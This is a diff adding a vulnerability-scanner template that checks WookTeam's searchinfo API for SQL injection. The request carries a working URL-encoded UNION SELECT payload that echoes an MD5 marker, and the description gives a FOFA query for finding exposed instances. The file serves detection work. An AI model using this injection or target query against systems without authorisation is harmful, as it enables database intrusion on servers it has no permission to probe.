@@ -1,0 +1,32 @@
+id: WookTeam-searchinfo-sql
+
+info:
+  name: WookTeam searchinfo SQL注入漏洞
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: title="Wookteam"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2CMD5%28123456%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e10adc3949ba59abbe56e057f20f883e'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
